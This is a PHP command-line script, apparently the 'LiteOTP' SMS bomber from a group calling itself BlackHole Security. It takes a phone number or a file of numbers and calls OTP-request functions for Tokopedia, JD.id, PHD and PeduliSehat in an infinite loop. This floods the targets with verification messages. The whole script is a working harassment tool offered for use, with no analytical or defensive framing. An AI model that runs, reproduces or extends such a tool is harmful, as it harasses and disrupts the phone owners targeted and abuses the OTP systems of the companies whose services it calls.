<?php

require __DIR__ . '/vendor/autoload.php';
use Cvar1984\LiteOtp\Otp;

if (strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R = '';
    $RR = '';
    $G = '';
    $GG = '';
    $B = '';
    $BB = '';
    $Y = '';
    $YY = '';
    $X = '';
} else {
    $R = "\e[91m";
    $RR = "\e[91;7m";
    $G = "\e[92m";
    $GG = "\e[92;7m";
    $B = "\e[36m";
    $BB = "\e[36;7m";
    $Y = "\e[93m";
    $YY = "\e[93;7m";
    $X = "\e[0m";
}

echo <<<BANNER
$Y _     _ _        ___ _____ ____
| |   (_) |_ ___ / _ \_   _|  _ \
| |   | | __/ _ \ | | || | | |_) |
| |___| | ||  __/ |_| || | |  __/
|_____|_|\__\___|\___/ |_| |_|

$R++++++++++++++++++++++++++++++++++++++
$B Author  : Cvar1984                   $R
$B Github  : https://github.com/Cvar1984$R
$B Team    : BlackHole Security         $R
$B Version : 2.0.7                      $R
$B Date    : 13-03-2018                 $R
$R++++++++++++++++++++++++++++++++++++++$G$X


BANNER;

try {
    if ($argc < 2) {
        throw new Exception('Input No List');
    }

    if (is_numeric($argv[1])) {
        $no = $argv[1];
        printf('%sSend OTP to %s[%s]%s%s', $G, $Y, $no, $X, PHP_EOL);
        Otp::tokopedia($no);

        while (1) {
            printf('%sSend OTP to %s[%s]%s%s', $G, $Y, $no, $X, PHP_EOL);
            Otp::jdid($no);
            Otp::phd($no);
            Otp::pedulisehat($no);
        }
    } elseif (is_file($argv[1])) {
        $no = $argv[1];
        $no = file_get_contents($no);
        $no = trim($no, " \t\n\r\0\x0B"); //remove whitespace
        $no = explode(PHP_EOL, $no);
        $count = sizeof($no);

        while (1) {
            for ($x = 0; $x < $count; $x++) {
                printf(
                    '%sSend OTP to %s[%s]%s%s',
                    $G,
                    $Y,
                    $no[$x],
                    $X,
                    PHP_EOL
                );
                Otp::tokopedia($no[$x]);
                Otp::jdid($no[$x]);
                Otp::phd($no[$x]);
                Otp::pedulisehat($no[$x]);
            }
        }
    } else {
        throw new Exception($argv[1] . ' Is not a file');
    }
} catch (Exception $e) {
    fprintf(STDERR, "%s%s%s\n", $RR, $e->getMessage(), $X);
    exit(1);
}
